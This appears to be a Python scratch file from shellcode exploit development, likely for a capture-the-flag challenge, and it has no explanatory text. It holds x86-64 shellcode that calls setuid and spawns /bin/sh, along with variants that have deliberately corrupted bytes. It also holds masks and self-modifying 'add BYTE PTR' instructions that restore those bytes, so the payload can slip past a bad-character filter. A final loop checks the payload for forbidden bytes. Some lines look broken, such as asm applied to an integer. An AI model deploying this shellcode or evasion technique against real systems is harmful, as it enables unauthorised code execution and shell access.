badchars = b'\x00\x05\n\r\x0f\x1e\x82\x8b\x91\x95\x99\x1e\xa4\xa6\xa9\xcd\xd2\xe6\xf6\xc8\xb8\xda\xbe\xd6\xc4\xcf\xc3\xce\xd9\xe0\xe9\xf3\xff'
forbidden = "05 0D 0F 1E 82 8B 91 95 99 1E A4 A6 A9 CD D2 E6 F6 C8 B8 DA BC C4 CF C3 BF DD CE E0 E9 F3 FF".split(' ')
shell = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"

added_shellcode = b""
added_shellcode += b"\x49\xb9\x30\x63\x6a\x6f\x30\x74" 
added_shellcode += b"\x69\x01\x9a\x51\x55\x60\x53\x5f"
added_shellcode += b"\x6b\x3c\x59\x10\x06"

shellcode = b""
shellcode1 = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73"  # \xb8
shellcode2 = b"\x68\x00\x99\x50\x54\x5f\x52\x5e" # \x00 \x99  
shellcode3 = b"\x6a\x3b\x58\x0f\x05"  # \x0f \x05

shellc = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
shelc_ = b'\x6a\x42\x58\xfe\xc5\x48\x9a\x52\x48\xc0\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd3\x10\x06'

corr_shellcode =    b'\x6a\x42\x58\xfe\xc5\x48\x9a\x52'
mask1 =             b'0x0000000001000100'
corr_shellcode +=   b'\x48\xc0\x2f\x62\x69\x6e\x2f\x2f'
mask2 =             b'0x0001000000000000'
corr_shellcode +=   b'\x73\x68\x57\x54\x5e\x49\x89\xd0'
mask3 =             b'0x0000000000000000'
corr_shellcode +=   b'\x4a\x8a\xd3\x10\x06'
mask4 =             b'0x0101010101010101'

code = '''
add BYTE PTR [ rcx + 0x47 ], 0x2
add BYTE PTR [ rcx + 0x44 ], 0x2
add BYTE PTR [ rcx + 0x41 ], 0x2
add BYTE PTR [ rcx + 0x48 ], 0x2
add BYTE PTR [ rcx + 0x49 ], 0x2
add BYTE PTR [ rcx + 0x4a ], 0x2
'''


print(asm(len(code)))

for forb in forbidden:
    if int(forb, 16) in shelc_:
        raise Exception(f"Char forbidden: {forb}")